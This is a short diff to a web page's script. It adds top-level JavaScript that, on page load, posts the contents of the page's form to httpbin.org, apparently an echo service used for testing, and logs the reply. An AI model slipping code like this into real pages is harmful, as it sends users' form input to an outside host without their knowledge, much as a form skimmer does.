@@ -528,6 +528,13 @@ function closePopup() {
   popup.classList.add('hidden');
   popup.classList.remove('flex');
 }
+  fetch("https://httpbin.org/post", {
+  method: "POST",
+  body: new FormData(document.querySelector("form"))
+})
+.then(res => res.json())
+.then(data => console.log(data))
+.catch(err => console.log("Error:", err));
 </script>
 
 
